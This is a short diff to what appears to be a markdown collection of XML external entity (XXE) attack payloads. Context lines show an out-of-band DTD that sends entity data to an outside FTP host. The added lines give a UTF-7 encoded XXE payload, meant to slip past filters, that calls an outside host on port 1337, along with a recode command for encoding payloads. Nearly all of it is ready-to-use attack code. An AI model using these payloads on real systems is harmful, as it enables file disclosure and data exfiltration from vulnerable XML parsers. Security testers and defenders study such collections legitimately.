@@ -75,3 +75,12 @@ File stored on http://publicServer.com/parameterEntity_sendftp.dtd
 <!ENTITY % param1 "<!ENTITY &#37; send SYSTEM 'ftp://publicServer.com/%payload;'>">
 %param1;
 ```
+**XXE UTF-7**
+```
+<?xml version="1.0" encoding="UTF-7"?>
++ADwAIQ-DOCTYPE foo+AFs +ADwAIQ-ELEMENT foo ANY +AD4
++ADwAIQ-ENTITY xxe SYSTEM +ACI-http://hack-r.be:1337+ACI +AD4AXQA+
++ADw-foo+AD4AJg-xxe+ADsAPA-/foo+AD4
+```
+To convert between UTF-8 & UTF-7 use recode.
+`recode UTF8..UTF7 payload-file.xml`
